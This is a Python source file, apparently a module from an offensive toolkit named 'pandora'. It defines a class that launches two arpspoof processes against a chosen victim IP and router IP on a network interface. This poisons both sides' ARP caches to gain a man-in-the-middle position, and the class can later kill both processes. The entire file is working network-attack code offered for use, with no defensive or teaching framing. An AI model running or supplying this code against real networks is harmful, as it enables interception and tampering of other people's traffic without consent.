from pandora.utils.program import ProgramBase

class Arpspoof(ProgramBase):
    program = 'arpspoof'
    def __init__(self):
        super().__init__()
        self.proc_router = None
        self.proc_target = None

    def spoof(self, ip_victim, ip_router, interface):
        cmd_router = [self.program, "-i", interface, "-t", ip_victim, "-r", ip_router]
        cmd_target = [self.program, "-i", interface, "-t", ip_router, ip_victim]
        # proc_router = sp.Popen(command_router, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        # proc_target = sp.Popen(command_target, stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
        self.proc_router = self.pcaller.executeret(cmd_router)
        self.proc_target = self.pcaller.executeret(cmd_target)

    def get_procs(self):
        return self.proc_router, self.proc_target

    def kill(self):
        self.proc_router.kill()
        self.proc_target.kill()
